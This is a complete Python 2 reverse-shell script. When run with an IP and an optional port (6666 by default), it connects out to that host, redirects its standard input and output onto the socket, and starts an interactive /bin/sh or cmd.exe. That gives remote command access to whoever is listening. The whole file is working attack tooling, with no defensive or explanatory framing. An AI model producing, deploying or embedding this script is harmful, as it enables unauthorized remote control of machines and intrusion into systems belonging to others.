#!//usr/bin/python
# -*- coding: utf-8 -*-

import socket
import subprocess
import os
import sys


def conn(ip,port):
    ip = str(ip)
    port = int(port)
    linux_bash = "/bin/sh"
    windows_cmd = "C:\Windows\System32\cmd.exe"
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip, port))
    print "[*] Connect Success"
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    if os.path.exists(linux_bash):
        p=subprocess.call([linux_bash,"-i"]);
        print "[*] This shell rebound to",ip,port
    elif os.path.exists(windows_cmd):
        p=subprocess.call([windows_cmd,"-i"]);
        print "[*] This shell rebound to",ip,port
    else:
        print "[!] The Command Controler Not Found, I will exit\n"
        print "[!] Please check ",linux_bash,"or",windows_cmd
        exit()

def usage():
    print "[-] Please input will connect IP and Port"
    print "[-] Default connect port is 6666\n"
    print "[-] Example :"
    print "[-] \t python",sys.argv[0],"123.123.123.123 6666"
    print "[!] I dont have get parameter, I will exit"
    exit()

if __name__ == '__main__':
    if len(sys.argv) == 2:
        ip = sys.argv[1]
        port = "6666"
        print "[*] OK!I will connect to " + str(ip) + ":" + str(port)
        conn(ip,port)
    elif len(sys.argv) == 3:
        ip = sys.argv[1]
        port = sys.argv[2]
        print "[*] OK!I will connect to " + str(ip) + ":" + str(port)
        conn(ip,port)
    else:
        usage()